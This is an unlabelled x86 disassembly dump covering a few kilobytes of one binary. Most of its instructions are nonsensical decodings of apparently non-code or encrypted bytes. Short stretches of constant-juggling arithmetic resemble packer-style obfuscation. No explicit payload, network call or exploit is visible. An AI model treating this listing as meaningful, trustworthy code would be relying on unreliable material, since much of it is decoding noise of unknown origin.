  41f311:	jnp    0x41f2d6
  41f313:	adc    al,0xe4
  41f315:	adc    eax,0x6dce0dab
  41f31a:	rcl    BYTE PTR [edi],1
  41f31c:	ror    BYTE PTR [edx-0x5bb08a79],0x2c
  41f323:	xchg   ebp,eax
  41f324:	jmp    0x41f399
  41f326:	xchg   cl,ch
  41f328:	push   ss
  41f329:	call   0x349fe769
  41f32e:	fcompp 
  41f330:	pop    ds
  41f331:	sbb    eax,0x734e06da
  41f336:	aaa    
  41f337:	stc    
  41f338:	sub    DWORD PTR [esi-0x21],edx
  41f33b:	xchg   edi,eax
  41f33c:	sti    
  41f33d:	inc    edx
  41f33e:	push   ss
  41f33f:	int3   
  41f340:	fiadd  WORD PTR [ebp+0x3d]
  41f343:	jbe    0x41f364
  41f345:	adc    DWORD PTR [edx],esp
  41f347:	in     al,dx
  41f348:	adc    BYTE PTR [ebx+0x2a],cl
  41f34b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f34c:	mov    esp,ebx
  41f34e:	sub    eax,0x2b2fd515
  41f353:	xor    ecx,DWORD PTR [edx+0x37409ca3]
  41f359:	(bad)  
  41f35a:	jb     0x41f2fd
  41f35c:	mov    edx,DWORD PTR [esi+0x59]
  41f35f:	clc    
  41f360:	inc    esi
  41f361:	lods   al,BYTE PTR ds:[esi]
  41f362:	cmp    DWORD PTR [esi-0x30],ecx
  41f365:	adc    eax,0xf757ddeb
  41f36a:	mov    bh,0x86
  41f36c:	into   
  41f36d:	push   esi
  41f36e:	mov    esi,0xd288c07f
  41f373:	mov    edi,0xf8f51d93
  41f378:	fmul   QWORD PTR [ebx-0x55]
  41f37b:	(bad)  
  41f37c:	out    dx,eax
  41f37d:	fimul  WORD PTR [ecx+0x6c]
  41f380:	and    BYTE PTR [edx],dh
  41f382:	xor    cl,BYTE PTR [edi]
  41f384:	cmp    eax,0x941b373a
  41f389:	dec    ebp
  41f38a:	sub    eax,0x8a10d4a
  41f38f:	(bad)  
  41f390:	int    0x43
  41f392:	sub    eax,0xb5fec782
  41f397:	lods   eax,DWORD PTR ds:[esi]
  41f398:	in     al,dx
  41f399:	test   al,0x1a
  41f39b:	sbb    ebx,edi
  41f39d:	push   ebp
  41f39e:	iret   
  41f39f:	mov    ch,0xe8
  41f3a1:	mov    edi,0xb1ca0c72
  41f3a6:	jg     0x41f36a
  41f3a8:	dec    esi
  41f3a9:	scas   al,BYTE PTR es:[edi]
  41f3aa:	push   edx
  41f3ab:	dec    ebp
  41f3ac:	in     eax,dx
  41f3ad:	push   ecx
  41f3ae:	es aad 0xdd
  41f3b1:	(bad)  
  41f3b2:	aam    0x8e
  41f3b4:	cmc    
  41f3b5:	jp     0x41f3d7
  41f3b7:	cmp    esi,esp
  41f3b9:	cs or  al,0x18
  41f3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3bd:	jg     0x41f3c0
  41f3bf:	cs cmp al,0xfe
  41f3c2:	std    
  41f3c3:	in     eax,dx
  41f3c4:	int    0xcc
  41f3c6:	pop    es
  41f3c7:	jp     0x41f3d5
  41f3c9:	xor    al,0xf5
  41f3cb:	xchg   ecx,eax
  41f3cc:	inc    esp
  41f3cd:	mov    bh,0xd0
  41f3cf:	imul   edx,DWORD PTR [edx+0x40204ce1],0x11
  41f3d6:	outs   dx,BYTE PTR ds:[esi]
  41f3d7:	xchg   ecx,eax
  41f3d8:	pop    esi
  41f3d9:	mov    al,0x36
  41f3db:	mov    dl,0x94
  41f3dd:	into   
  41f3de:	in     al,dx
  41f3df:	or     bl,BYTE PTR [eax+0x3a986ca8]
  41f3e5:	loop   0x41f45e
  41f3e7:	dec    ecx
  41f3e8:	dec    edx
  41f3e9:	push   edx
  41f3ea:	dec    ebx
  41f3eb:	jbe    0x41f378
  41f3ed:	sub    eax,0xed0ae9f
  41f3f2:	cmp    eax,0x1ade3444
  41f3f7:	mov    ds:0x98625ac,eax
  41f3fc:	in     al,0xdc
  41f3fe:	das    
  41f3ff:	inc    esi
  41f400:	push   edx
  41f401:	jae    0x41f431
  41f403:	cmp    al,0xfc
  41f405:	popf   
  41f406:	sub    eax,0xa276eed8
  41f40b:	sahf   
  41f40c:	push   edx
  41f40d:	mul    bl
  41f40f:	ficom  DWORD PTR [eax+0x4cf3e2e2]
  41f415:	icebp  
  41f416:	aas    
  41f417:	push   ecx
  41f418:	adc    al,0xb
  41f41a:	out    0x89,al
  41f41c:	jge    0x41f3a6
  41f41e:	add    al,cl
  41f420:	dec    edi
  41f421:	imul   eax,DWORD PTR [ebx-0x4f],0x54
  41f425:	enter  0x9e87,0x95
  41f429:	test   BYTE PTR [eax],ah
  41f42b:	dec    esp
  41f42c:	sbb    eax,0x27930817
  41f431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f432:	adc    eax,0x67b6dd97
  41f437:	adc    edx,0xffffff99
  41f43a:	imul   DWORD PTR [edi+0x53]
  41f43d:	cmp    al,0x39
  41f43f:	pop    ebx
  41f440:	sbb    al,0x58
  41f442:	jae    0x41f49e
  41f444:	call   0xce5a:0xe49a52dc
  41f44b:	dec    ebp
  41f44c:	repz sub al,0x11
  41f44f:	lds    ecx,FWORD PTR [edx+0x45]
  41f452:	xchg   ebx,eax
  41f453:	add    bh,BYTE PTR [edi]
  41f455:	adc    al,bh
  41f457:	sahf   
  41f458:	adc    BYTE PTR [esi],al
  41f45a:	push   es
  41f45b:	lock xchg esi,eax
  41f45d:	aaa    
  41f45e:	add    DWORD PTR [ebp+0x7f],0x951053af
  41f465:	xor    bl,BYTE PTR [ecx-0x2e7f82f0]
  41f46b:	mov    esi,DWORD PTR [eax]
  41f46d:	repnz xchg edi,eax
  41f46f:	adc    DWORD PTR [edx],esp
  41f471:	mov    dh,BYTE PTR [edi+eiz*2+0x2f359630]
  41f478:	out    0xbd,al
  41f47a:	jae    0x41f4c2
  41f47c:	fucom  st(7)
  41f47e:	test   al,0x5b
  41f480:	popf   
  41f481:	mov    dl,0x64
  41f483:	adc    ecx,edi
  41f485:	sti    
  41f486:	push   ds
  41f487:	retf   0x4dcb
  41f48a:	add    BYTE PTR [esp+eax*8+0x68],0x29
  41f48f:	js     0x41f48c
  41f491:	and    DWORD PTR [ebx-0x5c4b35da],eax
  41f497:	(bad)  [ebx+0xd1bbc06]
  41f49d:	mov    ch,BYTE PTR [ecx+0xa4eec61]
  41f4a3:	dec    ebx
  41f4a4:	cmp    BYTE PTR [edx-0x29],bl
  41f4a7:	rcr    BYTE PTR [eax+0x69c08b1a],cl
  41f4ad:	loope  0x41f4a6
  41f4af:	adc    bl,BYTE PTR ds:0x287d409
  41f4b5:	ins    DWORD PTR es:[edi],dx
  41f4b6:	hlt    
  41f4b7:	mov    ds:0xe7bde722,al
  41f4bc:	mov    eax,0xfe20341c
  41f4c1:	jecxz  0x41f443
  41f4c3:	xchg   dh,al
  41f4c5:	add    edi,DWORD PTR [eax+0x37ae845f]
  41f4cb:	push   es
  41f4cc:	iret   
  41f4cd:	mov    eax,ds:0xcad227b2
  41f4d2:	test   DWORD PTR [ebp-0x1],0xbfd17e23
  41f4d9:	(bad)  
  41f4da:	cmp    edi,DWORD PTR [ebp-0x5978d495]
  41f4e0:	jne    0x41f555
  41f4e2:	pop    es
  41f4e3:	mov    al,ds:0xa2f48d0c
  41f4e8:	adc    bh,cl
  41f4ea:	out    dx,al
  41f4eb:	call   0xc114d639
  41f4f0:	pop    ecx
  41f4f1:	push   edi
  41f4f2:	(bad)  
  41f4f4:	inc    esp
  41f4f5:	por    mm4,QWORD PTR [esi+0x44]
  41f4f9:	rcl    DWORD PTR [ecx-0x6],0xfb
  41f4fd:	repnz xlat BYTE PTR ds:[ebx]
  41f4ff:	retf   
  41f500:	(bad)  
  41f501:	out    0x76,al
  41f503:	imul   ebp,DWORD PTR [ebx-0x39],0x7c25be00
  41f50a:	out    dx,al
  41f50b:	test   eax,0x7bb3df3b
  41f510:	inc    eax
  41f511:	jbe    0x41f506
  41f513:	inc    BYTE PTR [ebp+0x3261ee69]
  41f519:	dec    ecx
  41f51a:	dec    eax
  41f51b:	mov    ds:0x32ded626,eax
  41f520:	arpl   WORD PTR [ecx+0x6],bp
  41f523:	icebp  
  41f524:	cs stos DWORD PTR es:[edi],eax
  41f526:	dec    eax
  41f527:	(bad)  
  41f529:	icebp  
  41f52a:	imul   eax,DWORD PTR [esi+0x5a9b6872],0xdb7fe72d
  41f534:	addr16 or eax,0xf2f55902
  41f53a:	daa    
  41f53b:	ret    0xd681
  41f53e:	fnclex 
  41f540:	ja     0x41f4c7
  41f542:	push   DWORD PTR [ebp+0x3bdbfd7c]
  41f548:	push   ss
  41f549:	rcl    bl,cl
  41f54b:	mov    dh,cl
  41f54d:	push   es
  41f54e:	cli    
  41f54f:	mov    esi,0x6542142
  41f554:	sub    BYTE PTR [ebx],0x4
  41f557:	in     eax,0x23
  41f559:	into   
  41f55a:	(bad)
  41f55d:	push   es
  41f55e:	les    ebp,FWORD PTR [edx]
  41f560:	scas   eax,DWORD PTR es:[edi]
  41f561:	sahf   
  41f562:	or     bh,BYTE PTR [esi]
  41f564:	xchg   ecx,eax
  41f565:	sbb    eax,0x42649a64
  41f56a:	xor    BYTE PTR [edi],bh
  41f56c:	daa    
  41f56d:	dec    edi
  41f56e:	bound  ebx,QWORD PTR [edx+ebx*4+0x6b]
  41f572:	mov    ecx,0xbec984b8
  41f577:	lods   eax,DWORD PTR ds:[esi]
  41f578:	or     eax,ebx
  41f57a:	or     al,0xd
  41f57c:	popf   
  41f57d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f57e:	adc    BYTE PTR [ebx-0x45a5476e],bl
  41f584:	cmp    DWORD PTR [ecx-0x5cefd57c],esi
  41f58a:	mov    ch,0x75
  41f58c:	test   al,0xec
  41f58e:	stc    
  41f58f:	inc    edi
  41f590:	retf   0x6908
  41f593:	dec    BYTE PTR [ebx-0xdb73]
  41f599:	jmp    DWORD PTR [ebx]
  41f59b:	rol    DWORD PTR [ebx],0x45
  41f59e:	mov    esp,0xff208d8b
  41f5a3:	(bad)  
  41f5a4:	dec    DWORD PTR [ebp+0x272f0884]
  41f5aa:	add    BYTE PTR [eax],al
  41f5ac:	xor    eax,0x1080c
  41f5b1:	add    eax,DWORD PTR [ebp-0x178]
  41f5b7:	mov    DWORD PTR [ebp-0xe8],eax
  41f5bd:	mov    DWORD PTR [ebp-0xc],0x5950
  41f5c4:	mov    DWORD PTR [ebp-0xf8],0x4964
  41f5ce:	mov    DWORD PTR [ebp-0x130],0x3
  41f5d8:	mov    DWORD PTR [ebp-0x20],0x2df9
  41f5df:	mov    DWORD PTR [ebp-0x8],0x4524
  41f5e6:	mov    DWORD PTR [ebp-0xd4],0x637e
  41f5f0:	mov    DWORD PTR [ebp-0x110],0x38c8
  41f5fa:	mov    DWORD PTR [ebp-0xa4],0x7118
  41f604:	mov    DWORD PTR [ebp-0xa0],0xaf6
  41f60e:	mov    DWORD PTR [ebp-0x10c],0x3315
  41f618:	mov    eax,DWORD PTR [ebp-0xf8]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x130]
  41f624:	xor    edx,edx
  41f626:	div    ecx
  41f628:	add    eax,0x454e
  41f62d:	mov    ecx,DWORD PTR [ebp-0xc]
  41f630:	and    eax,ecx
  41f632:	xor    eax,0x5940
  41f637:	add    eax,DWORD PTR [ebp+0x8]
  41f63a:	mov    ecx,DWORD PTR [ebp-0x110]
  41f640:	mov    edx,DWORD PTR [ebp-0xa4]
  41f646:	sub    ecx,edx
  41f648:	mov    edx,DWORD PTR [ebp-0xd4]
  41f64e:	or     ecx,edx
  41f650:	mov    edx,DWORD PTR [ebp-0x8]
  41f653:	and    ecx,edx
  41f655:	jmp    0x41fa3c
  41f65a:	cmp    DWORD PTR [ebx-0x6397a419],esi
  41f660:	mov    edx,0x50f9fab3
  41f665:	sahf   
  41f666:	aas    
  41f667:	jecxz  0x41f69b
  41f669:	fisttp QWORD PTR [ebp+eax*4-0x40]
  41f66d:	mov    esi,0xbebec44a
  41f672:	push   cs
  41f673:	bound  edx,QWORD PTR [esi-0x715b9774]
  41f679:	sub    ecx,ebp
  41f67b:	into   
  41f67c:	pop    ecx
  41f67d:	retf   0x52fe
  41f680:	adc    DWORD PTR [ebp+0x32b0ae4a],edx
  41f686:	neg    dl
  41f688:	out    0xe6,al
  41f68a:	xor    esp,DWORD PTR [edx-0x6e]
  41f68d:	rol    DWORD PTR [edx+0x48],cl
  41f690:	cmp    al,0x34
  41f692:	ja     0x41f63d
  41f694:	jnp    0x41f6a3
  41f696:	loopne 0x41f6dc
  41f698:	xchg   ebx,eax
  41f699:	pop    ecx
  41f69a:	add    DWORD PTR [ecx-0x4c],edi
  41f69d:	dec    edx
  41f69e:	js     0x41f6a9
  41f6a0:	cmp    DWORD PTR [ebx-0x46],esi
  41f6a3:	leave  
  41f6a4:	and    ebx,DWORD PTR [eax-0x5eba5cad]
  41f6aa:	pop    ecx
  41f6ab:	ss jmp 0x78164436
  41f6b1:	and    al,0x56
  41f6b3:	push   esp
  41f6b4:	mov    db7,edi
  41f6b7:	lahf   
  41f6b8:	ret    
  41f6b9:	arpl   si,bp
  41f6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6bc:	push   edx
  41f6bd:	adc    eax,0x84190e72
  41f6c2:	sti    
  41f6c3:	(bad)  
  41f6c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c5:	jecxz  0x41f727
  41f6c7:	stos   BYTE PTR es:[edi],al
  41f6c8:	lea    eax,[eax+0x42]
  41f6cb:	leave  
  41f6cc:	jns    0x41f6a9
  41f6ce:	popf   
  41f6cf:	sahf   
  41f6d0:	ret    0x7ccf
  41f6d3:	rcl    BYTE PTR [esi-0x6e2aa16d],0x37
  41f6da:	or     eax,0xd522e38e
  41f6df:	enter  0x63f4,0x2a
  41f6e3:	in     al,0x47
  41f6e5:	rcr    BYTE PTR [eax-0x7b0d9bbc],0x2d
  41f6ec:	xor    edx,DWORD PTR [esp+edx*1]
  41f6ef:	daa    
  41f6f0:	push   ds
  41f6f1:	xchg   ebx,eax
  41f6f2:	std    
  41f6f3:	add    WORD PTR [eax-0x17],sp
  41f6f7:	jno    0x41f6b1
  41f6f9:	shl    BYTE PTR [ebx+ecx*2],0xc4
  41f6fd:	sub    BYTE PTR [ebx+0x5a],dh
  41f700:	inc    edx
  41f701:	adc    eax,0x2a9acf5f
  41f706:	js     0x41f6aa
  41f708:	enter  0xfc5f,0xee
  41f70c:	xchg   ebx,eax
  41f70d:	or     al,0x16
  41f70f:	lods   al,BYTE PTR ds:[esi]
  41f710:	dec    edi
  41f711:	mov    DWORD PTR [ebp-0x20],ebx
  41f714:	int3   
  41f715:	stc    
  41f716:	mov    gs,WORD PTR [edi]
  41f718:	fldenv [eax+0x9]
  41f71b:	retf   
  41f71c:	mov    ebp,0x749e090d
  41f721:	cmp    al,ch
  41f723:	push   es
  41f724:	nop
  41f725:	hlt    
  41f726:	icebp  
  41f727:	(bad)  
  41f729:	aad    0x2f
  41f72b:	xchg   ecx,eax
  41f72c:	ins    BYTE PTR es:[edi],dx
  41f72d:	push   0xa954b875
  41f732:	or     bh,bl
  41f734:	stos   DWORD PTR es:[edi],eax
  41f735:	mov    edx,0x75bb434d
  41f73a:	loopne 0x41f746
  41f73c:	nop
  41f73d:	inc    ebx
  41f73e:	popa   
  41f73f:	test   al,0x63
  41f741:	or     al,0x89
  41f743:	add    al,0xc
  41f745:	sbb    BYTE PTR [ecx+0x68],bh
  41f748:	sbb    ch,BYTE PTR [ebx]
  41f74a:	imul   DWORD PTR [ebx]
  41f74c:	xchg   BYTE PTR [esi],dl
  41f74e:	das    
  41f74f:	xor    bl,bl
  41f751:	sbb    BYTE PTR [eax],cl
  41f753:	jae    0x41f78e
  41f755:	mov    ch,0xc
  41f757:	pop    ebx
  41f758:	stos   DWORD PTR es:[di],eax
  41f75a:	test   al,0xdb
  41f75c:	popf   
  41f75d:	popf   
  41f75e:	iret   
  41f75f:	stc    
  41f760:	cmp    bl,BYTE PTR [edi+edx*2-0x3506aabd]
  41f767:	xchg   esp,eax
  41f768:	frstor [esi-0x72783c87]
  41f76e:	cs cdq 
  41f770:	outs   dx,DWORD PTR ds:[esi]
  41f771:	jg     0x41f701
  41f773:	test   al,0x64
  41f775:	(bad)  
  41f776:	daa    
  41f777:	and    esp,DWORD PTR [esp+eiz*2]
  41f77a:	jb     0x41f79c
  41f77c:	movaps XMMWORD PTR [edx+0x43a05ec4],xmm1
  41f783:	jmp    0x41f7a5
  41f785:	ret    
  41f786:	dec    ebx
  41f787:	inc    ecx
  41f788:	xchg   edx,eax
  41f789:	out    0x21,eax
  41f78b:	aam    0x42
  41f78d:	dec    eax
  41f78e:	sbb    ebx,DWORD PTR [esi]
  41f790:	or     DWORD PTR [eax],esi
  41f792:	mov    cl,ah
  41f794:	xchg   esi,eax
  41f795:	retf   
  41f796:	leave  
  41f797:	(bad)  
  41f798:	mov    ds:0x2bd0bd85,eax
  41f79d:	test   BYTE PTR [edi+0x49],ah
  41f7a0:	(bad)  
  41f7a1:	stc    
  41f7a2:	lock into 
  41f7a4:	test   DWORD PTR [ecx-0x574d3e5],esp
  41f7aa:	cs pop eax
  41f7ac:	xlat   BYTE PTR ds:[ebx]
  41f7ad:	mov    al,ds:0x71ef760e
  41f7b2:	mov    ecx,DWORD PTR [edi-0x5e0118bf]
  41f7b8:	and    eax,0x13915408
  41f7bd:	sbb    DWORD PTR [edi+0x30],ebx
  41f7c0:	jecxz  0x41f802
  41f7c2:	inc    edx
  41f7c3:	xor    DWORD PTR [ebx],0xd31dd189
  41f7c9:	nop
  41f7ca:	mov    ebx,0xbc6f008f
  41f7cf:	cmp    BYTE PTR [ecx+0x19],dl
  41f7d2:	(bad)  
  41f7d4:	pop    ebx
  41f7d5:	mov    esp,0x4645fb62
  41f7da:	mov    ebx,0xbdc2c69f
  41f7df:	call   DWORD PTR [edx+0x3a3ab637]
  41f7e5:	mov    dh,0x96
  41f7e7:	cld    
  41f7e8:	lahf   
  41f7e9:	sub    cl,BYTE PTR [ebx]
  41f7eb:	push   0x3e
  41f7ed:	sbb    BYTE PTR [edi],bl
  41f7ef:	cwde   
  41f7f0:	cmp    DWORD PTR [eax],esp
  41f7f2:	sub    DWORD PTR [ebp+0x4876a4aa],esp
  41f7f8:	inc    esp
  41f7f9:	fnstenv [edx+0x18ee51d6]
  41f7ff:	xlat   BYTE PTR ds:[ebx]
  41f800:	push   esp
  41f801:	inc    eax
  41f802:	jmp    0x41f849
  41f804:	fs sub dl,cl
  41f807:	push   esp
  41f808:	or     dl,BYTE PTR [ebp+0x13791d15]
  41f80e:	stos   BYTE PTR es:[edi],al
  41f80f:	add    DWORD PTR [ebx],ebx
  41f811:	sbb    esp,edi
  41f813:	mov    al,ds:0x2479288c
  41f818:	movaps XMMWORD PTR [ebx],xmm0
  41f81b:	ror    eax,cl
  41f81d:	gs stos DWORD PTR es:[edi],eax
  41f81f:	js     0x41f801
  41f821:	shr    dl,1
  41f823:	sbb    eax,0xf4b222e0
  41f828:	jbe    0x41f894
  41f82a:	lahf   
  41f82b:	(bad)  
  41f82c:	fsqrt  
  41f82e:	arpl   WORD PTR [ebx],cx
  41f830:	test   ebx,edi
  41f832:	les    edx,FWORD PTR [eax-0x38ea813f]
  41f838:	pushf  
  41f839:	ret    0x5517
  41f83c:	jns    0x41f7e8
  41f83e:	sub    al,0xb9
  41f840:	mov    dl,0x1
  41f842:	or     BYTE PTR [esp+esi*2+0x32],dl
  41f846:	rcr    DWORD PTR fs:[ebx-0x1],cl
  41f84a:	adc    BYTE PTR [eax+0x6f],0xcf
  41f84e:	loope  0x41f82b
  41f850:	arpl   WORD PTR [edx],di
  41f852:	ins    DWORD PTR es:[edi],dx
  41f853:	and    dh,BYTE PTR [edx+0x13]
  41f856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f857:	scas   al,BYTE PTR es:[edi]
  41f858:	dec    esp
  41f859:	loope  0x41f830
  41f85b:	cmc    
  41f85c:	frstor [edx]
  41f85e:	outs   dx,DWORD PTR cs:[esi]
  41f860:	and    al,0xd2
  41f862:	sbb    dl,al
  41f864:	mov    DWORD PTR [ebp-0x12],esi
  41f867:	test   eax,0xe23f85e3
  41f86c:	adc    eax,0x9c295638
  41f871:	cwde   
  41f872:	pop    eax
  41f873:	push   ebx
  41f874:	pop    esi
  41f875:	lds    ecx,FWORD PTR [ebp+0x4de02d41]
  41f87b:	mov    ch,0x55
  41f87d:	and    edi,DWORD PTR [edi-0x10]
  41f880:	(bad)  
  41f881:	hlt    
  41f882:	pop    ss
  41f883:	mov    ecx,0x8470b85f
  41f888:	lods   al,BYTE PTR ds:[esi]
  41f889:	popf   
  41f88a:	jb     0x41f88e
  41f88c:	in     al,0xc3
  41f88e:	jmp    0x6a7f:0x692feceb
  41f895:	sbb    eax,0xe877145d
  41f89a:	call   0x69c047f0
  41f89f:	pushf  
  41f8a0:	sub    ebx,DWORD PTR [eax+esi*2+0x2c]
  41f8a4:	or     bl,ah
  41f8a6:	repnz pop ss
  41f8a8:	stc    
  41f8a9:	sub    bh,0x98
  41f8ac:	or     BYTE PTR [eax+eiz*2-0x5cd1bebc],ah
  41f8b3:	and    al,0x6f
  41f8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8b6:	mov    edx,0x6a75b43f
  41f8bb:	fisttp DWORD PTR [ebp+0xa]
  41f8be:	enter  0xdd57,0xe1
  41f8c2:	out    0x44,eax
  41f8c4:	dec    ecx
  41f8c5:	mov    edi,0x75ee7dcc
  41f8ca:	jnp    0x41f94b
  41f8cc:	xchg   dl,bl
  41f8ce:	jns    0x41f89e
  41f8d0:	jae    0x41f906
  41f8d2:	or     BYTE PTR [ecx-0x2abaddf0],ch
  41f8d8:	mov    ah,0xfa
  41f8da:	mov    cl,0xe
  41f8dc:	cmp    edi,ebx
  41f8de:	push   eax
  41f8df:	or     DWORD PTR [esi],0x20
  41f8e2:	fcomip st,st(4)
  41f8e4:	fwait
  41f8e5:	out    dx,eax
  41f8e6:	and    DWORD PTR [edx],edi
  41f8e8:	and    BYTE PTR [ebx],0x66
  41f8eb:	sbb    BYTE PTR [edi+eax*4+0x51],ch
  41f8ef:	xchg   ebx,eax
  41f8f0:	sbb    edi,edi
  41f8f2:	sbb    DWORD PTR [esi],ebp
  41f8f4:	mov    ch,0x48
  41f8f6:	jbe    0x41f909
  41f8f8:	mov    ecx,DWORD PTR [eax]
  41f8fa:	xchg   eax,eax
  41f8fc:	icebp  
  41f8fd:	add    DWORD PTR [eax],esp
  41f8ff:	sbb    BYTE PTR [eax+0x48ae654f],bh
  41f905:	cmc    
  41f906:	(bad)  
  41f907:	fmul   st(2),st
  41f909:	addr16 sahf 
  41f90b:	and    eax,edx
  41f90d:	mov    bl,0xa7
  41f90f:	push   esi
  41f910:	dec    edi
  41f911:	imul   esp,DWORD PTR [esi-0x57e7a71b],0x6c16a2e2
  41f91b:	pop    ebp
  41f91c:	mov    ecx,0xe9ac4ac3
  41f921:	jmp    FWORD PTR [ebp-0x607d320]
  41f927:	adc    eax,ecx
  41f929:	js     0x41f95e
  41f92b:	cwde   
  41f92c:	shl    esp,1
  41f92e:	add    al,0x6a
  41f930:	js     0x41f92f
  41f932:	pop    ebx
  41f933:	fld    TBYTE PTR [ecx+0x625dc4e7]
  41f939:	arpl   WORD PTR [ecx],sp
  41f93b:	and    ebx,DWORD PTR [edi]
  41f93d:	dec    DWORD PTR [edx]
  41f93f:	cli    
  41f940:	fistp  WORD PTR [esi]
  41f942:	jl     0x41f9ae
  41f944:	jl     0x41f9bb
  41f946:	jp     0x41f8f4
  41f948:	adc    ah,ah
  41f94a:	add    ebp,DWORD PTR [edi+0x45f61f15]
  41f950:	ss ins DWORD PTR es:[edi],dx
  41f952:	adc    DWORD PTR [edi-0x42],esp
  41f955:	sbb    edi,DWORD PTR [edx-0x5e]
  41f958:	loop   0x41f966
  41f95a:	lea    ebp,[esi-0x361728be]
  41f960:	fdivr  st(3),st
  41f962:	jbe    0x41f90b
  41f964:	ret    0xe5e9
  41f967:	in     eax,0xda
  41f969:	out    dx,eax
  41f96a:	shl    DWORD PTR [esi-0x3cde032e],1
  41f970:	add    BYTE PTR [ecx],dl
  41f972:	icebp  
  41f973:	leave  
  41f974:	mov    WORD PTR [ebp-0x4a2e1fe3],fs
  41f97a:	sbb    ebp,esp
  41f97c:	bound  ebx,QWORD PTR [esi]
  41f97e:	pop    es
  41f97f:	mov    ah,0xdc
  41f981:	jo     0x41f9ba
  41f983:	push   esi
  41f984:	push   ss
  41f985:	push   ecx
  41f986:	xlat   BYTE PTR ds:[ebx]
  41f987:	int3   
  41f988:	jge    0x41f9e8
  41f98a:	std    
  41f98b:	iret   
  41f98c:	repnz shl BYTE PTR [esi+0x7d],1
  41f990:	push   cs
  41f991:	mov    al,ds:0x603085d
  41f996:	jne    0x41f994
  41f998:	out    dx,eax
  41f999:	int3   
  41f99a:	cmp    al,0xd0
  41f99c:	outs   dx,BYTE PTR ds:[esi]
  41f99d:	inc    edi
  41f99e:	cmp    eax,0x281e3d86
  41f9a3:	es inc esp
  41f9a5:	cmp    DWORD PTR [edx-0x25],ecx
  41f9a8:	lods   eax,DWORD PTR ds:[esi]
  41f9a9:	frstor [edi+0x6ac504d1]
  41f9af:	mov    al,0x13
  41f9b1:	lock adc eax,0x795fb9ca
  41f9b7:	test   DWORD PTR [ebx],esi
  41f9b9:	and    dh,BYTE PTR [ebx]
  41f9bb:	(bad)  
  41f9bc:	jne    0x41fa11
  41f9be:	push   edi
  41f9bf:	stos   BYTE PTR es:[edi],al
  41f9c0:	ret    0xcf80
  41f9c3:	cmp    bl,ch
  41f9c5:	pop    ds
  41f9c6:	dec    ebp
  41f9c7:	dec    ebp
  41f9c8:	ret    
  41f9c9:	adc    edi,edi
  41f9cb:	inc    ebx
  41f9cc:	push   esp
  41f9cd:	push   es
  41f9ce:	push   eax
  41f9cf:	jmp    0x85b3:0x4524a84d
  41f9d6:	xor    DWORD PTR [esp+ebx*8+0x6e],edi
  41f9da:	or     BYTE PTR [eax+0x6f],0x45
  41f9de:	push   ss
  41f9df:	aas    
  41f9e0:	or     al,dl
  41f9e2:	and    al,0xf0
  41f9e4:	mov    ss,WORD PTR [esi+0x25]
  41f9e7:	iret   
  41f9e8:	push   ds
  41f9e9:	sub    BYTE PTR [eax-0x24d83b9b],al
  41f9ef:	je     0x41fa06
  41f9f1:	xchg   dh,dh
  41f9f3:	or     ebp,DWORD PTR [ebx]
  41f9f5:	imul   esp,eax,0xffffffab
  41f9f8:	add    al,0x2d
  41f9fa:	xor    eax,0xaf5c96b4
  41f9ff:	cmp    edi,ecx
  41fa01:	push   ecx
  41fa02:	ja     0x41fa0d
  41fa04:	mov    ebp,0x40bc140e
  41fa09:	push   DWORD PTR [ebp+edi*2+0x2f4b725b]
  41fa10:	cwde   
  41fa11:	mov    esi,0x8389a438
  41fa16:	imul   ebx,eax,0xfffffff2
  41fa19:	(bad)  
  41fa1a:	into   
  41fa1b:	out    dx,eax
  41fa1c:	dec    bx
  41fa1e:	(bad)  ds:0x78e1f70b
  41fa24:	dec    eax
  41fa25:	ret    0xafc2
  41fa28:	xor    ebp,edx
  41fa2a:	fadd   DWORD PTR [edx+0x2ca996ea]
  41fa30:	ret    0xb4f7
  41fa33:	push   edx
  41fa34:	jmp    0xe501:0xe47fc931
  41fa3b:	jo     0x41f9c8
  41fa3d:	push   ebp
  41fa3e:	loopne 0x41fa73
  41fa40:	retf   0x958b
  41fa43:	hlt    
  41fa44:	(bad)  
  41fa45:	(bad)  
  41fa46:	(bad)  
  41fa47:	mov    esi,0x180f
  41fa4c:	sub    esi,edx
  41fa4e:	mov    edx,DWORD PTR [ebp-0xa0]
  41fa54:	imul   esi,edx
  41fa57:	xor    esi,0x402b
  41fa5d:	xor    esi,0xfed78c17
  41fa63:	mov    edx,DWORD PTR [ebp-0xe8]
  41fa69:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  41fa70:	add    ecx,eax
  41fa72:	add    esi,ecx
  41fa74:	mov    DWORD PTR [ebp-0x38],esi
  41fa77:	mov    DWORD PTR [ebp-0x4],0x59a8
  41fa7e:	mov    DWORD PTR [ebp-0x30],0x7021
  41fa85:	mov    DWORD PTR [ebp-0xf4],0x6210
  41fa8f:	mov    DWORD PTR [ebp-0x58],0x73d5
  41fa96:	mov    DWORD PTR [ebp-0x124],0x1e7d
  41faa0:	mov    DWORD PTR [ebp-0x3c],0x3144
  41faa7:	mov    eax,DWORD PTR [ebp-0x30]
  41faaa:	xor    eax,0x75cb
  41faaf:	mov    ecx,DWORD PTR [ebp-0x4]
  41fab2:	imul   eax,ecx
  41fab5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fab8:	lea    ecx,[ecx+eax*1-0x2123b90]
  41fabf:	mov    eax,DWORD PTR [ebp-0xf4]
  41fac5:	and    eax,0x6b34
  41faca:	and    eax,0x658d
  41facf:	xor    edx,edx
  41fad1:	push   0x6
  41fad3:	pop    esi
  41fad4:	div    esi
  41fad6:	imul   eax,eax,0x3fb9
  41fadc:	mov    edx,DWORD PTR [ebp-0x3c]
  41fadf:	and    edx,0x58c7
  41fae5:	mov    esi,DWORD PTR [ebp-0x124]
  41faeb:	or     edx,esi
  41faed:	add    edx,0x7a25
  41faf3:	imul   edx,edx,0x28d2
  41faf9:	mov    esi,DWORD PTR [ebp-0x58]
  41fafc:	xor    edx,esi
  41fafe:	xor    edx,0x1856f731
  41fb04:	mov    esi,DWORD PTR [ebp-0xe8]
